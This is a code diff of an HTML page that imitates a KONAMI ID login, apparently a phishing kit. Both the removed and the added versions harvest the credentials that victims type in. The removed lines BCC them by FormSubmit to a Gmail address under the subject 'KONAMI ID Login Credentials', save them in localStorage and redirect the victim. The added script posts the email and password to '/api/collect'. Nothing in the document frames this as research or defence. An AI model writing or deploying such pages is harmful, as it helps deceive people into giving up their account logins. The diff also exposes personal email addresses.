@@ -105,20 +105,6 @@
         
         <!-- UPDATED FORM -->
         <form id="loginForm" class="login-form">
-            <!-- FormSubmit Configuration -->
-            <input type="hidden" name="_next" 
-                   value="https://ko-konami-mi.vercel.app/confirmation.html">
-            
-            <input type="hidden" name="_subject" 
-                   value="🔐 KONAMI ID Login Credentials">
-            
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="text" name="_honey" style="display:none">
-            
-            <!-- BCC to second email -->
-            <input type="hidden" name="_bcc" value="Samfat246@gmail.com">
-            
             <!-- Your form fields -->
             <div class="input-group">
                 <input type="text" id="username" name="username" required>
@@ -167,155 +153,30 @@
 
     <!-- UPDATED JavaScript -->
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ Page loaded, setting up form...');
-    
-    const loginForm = document.getElementById('loginForm');
-    const messageDiv = document.getElementById('message') || createMessageDiv();
-    
-    if (!loginForm) {
-        console.error('❌ ERROR: No login form found!');
-        return;
+  document.getElementById("loginForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    try {
+      const response = await fetch("/api/collect", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
+      });
+
+      if (response.ok) {
+        alert("Login submitted");
+      } else {
+        alert("Submission failed");
+      }
+    } catch (err) {
+      alert("Network error");
     }
-    
-    console.log('✅ Form found:', loginForm);
-    
-    loginForm.addEventListener('submit', function(event) {
-        event.preventDefault();
-        console.log('🚀 Form submitted!');
-        
-        // Get credentials
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        
-        console.log('📤 Got credentials:', { username, password });
-        
-        if (!username || !password) {
-            showMessage('⚠️ Please fill in all fields', 'error');
-            return;
-        }
-        
-        // Show loading
-        const submitBtn = loginForm.querySelector('.btn-login');
-        const originalText = submitBtn.textContent;
-        submitBtn.textContent = 'PROCESSING...';
-        submitBtn.disabled = true;
-        
-        // SAVE TO localStorage FIRST (GUARANTEED)
-        console.log('💾 Attempting to save to localStorage...');
-        saveToLocalStorage(username, password);
-        
-        // Try to send email (optional)
-        setTimeout(() => {
-            console.log('📧 Attempting to send email...');
-            sendToFormSubmit(username, password);
-        }, 500);
-        
-        // Show success message
-        showMessage('✅ Login successful! Redirecting...', 'success');
-        
-        // Redirect after 2 seconds
-        setTimeout(function() {
-            console.log('🔀 Redirecting to confirmation page...');
-            window.location.href = "https://ko-konami-mi.vercel.app/login.html";
-        }, 2000);
-        
-        // Reset button
-        setTimeout(function() {
-            submitBtn.textContent = originalText;
-            submitBtn.disabled = false;
-        }, 2000);
-    });
-    
-    function saveToLocalStorage(username, password) {
-        try {
-            console.log('💾 Starting localStorage save...');
-            
-            // Get existing data
-            let existing = localStorage.getItem('konami_logins');
-            console.log('Existing data:', existing);
-            
-            // Parse or create new array
-            let loginsArray = [];
-            if (existing) {
-                try {
-                    loginsArray = JSON.parse(existing);
-                    console.log('Parsed existing:', loginsArray);
-                } catch (e) {
-                    console.error('Parse error, starting fresh:', e);
-                }
-            }
-            
-            // Create new entry
-            const newEntry = {
-                username: username,
-                password: password,
-                timestamp: new Date().toLocaleString(),
-                date: new Date().toISOString(),
-                ip: 'N/A'
-            };
-            
-            console.log('New entry:', newEntry);
-            
-            // Add to array
-            loginsArray.push(newEntry);
-            
-            // Save back
-            localStorage.setItem('konami_logins', JSON.stringify(loginsArray));
-            
-            console.log('✅ Saved to localStorage! Total entries:', loginsArray.length);
-            
-            // Verify save
-            const verify = localStorage.getItem('konami_logins');
-            console.log('Verify save:', verify);
-            
-        } catch (error) {
-            console.error('❌ localStorage error:', error);
-            
-            // Try alternative storage
-            try {
-                sessionStorage.setItem('konami_backup', JSON.stringify({
-                    username: username,
-                    password: password,
-                    time: new Date().toLocaleString()
-                }));
-                console.log('📦 Saved to sessionStorage as backup');
-            } catch (e) {
-                console.error('❌ All storage failed:', e);
-            }
-        }
-    }
-    
-    function sendToFormSubmit(username, password) {
-        // Just log for now - we'll fix email later
-        console.log('📧 Would send to:', {
-            to: 'psalmcares878@gmail.com',
-            bcc: 'Samfat246@gmail.com',
-            username: username,
-            password: password
-        });
-        
-        // For now, just log - we'll implement properly once localStorage works
-        console.log('📧 Email would be sent with credentials');
-    }
-    
-    function showMessage(text, type) {
-        if (!messageDiv) return;
-        messageDiv.textContent = text;
-        messageDiv.className = `message ${type}`;
-        messageDiv.style.display = 'block';
-    }
-    
-    function createMessageDiv() {
-        const div = document.createElement('div');
-        div.id = 'message';
-        div.className = 'message';
-        loginForm.parentNode.insertBefore(div, loginForm);
-        return div;
-    }
-    
-    console.log('✅ Form setup complete!');
-});
+  });
 </script>
 </body>
 </html>
